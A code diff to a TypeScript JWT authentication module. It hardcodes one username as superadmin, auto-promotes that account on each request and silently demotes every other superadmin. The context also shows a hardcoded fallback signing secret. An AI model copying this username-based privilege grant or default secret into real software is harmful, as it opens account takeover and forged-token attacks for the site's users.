@@ -16,6 +16,7 @@ const ACCESS_COOKIE = "accessToken";
 const REFRESH_COOKIE = "refreshToken";
 const ACCESS_TTL_SECONDS = 60 * 15;
 const REFRESH_TTL_SECONDS = 60 * 60 * 24 * 30;
+const SUPERADMIN_USERNAME = "saeedheydari98";
 
 function secret() {
   return process.env.JWT_SECRET || process.env.AUTH_SECRET || "development-jwt-secret-change-me";
@@ -114,6 +115,14 @@ export async function getAuthUser(request: Request): Promise<AuthUser | null> {
     where: { id },
     select: { id: true, email: true, username: true, name: true, role: true, avatarUrl: true },
   });
+  if (user?.username === SUPERADMIN_USERNAME && user.role !== "superadmin") {
+    user.role = "superadmin";
+    await prisma.user.update({ where: { id: user.id }, data: { role: "superadmin" } });
+  }
+  if (user?.username !== SUPERADMIN_USERNAME && user?.role === "superadmin") {
+    user.role = "user";
+    await prisma.user.update({ where: { id: user.id }, data: { role: "user" } });
+  }
   return user ?? null;
 }
 
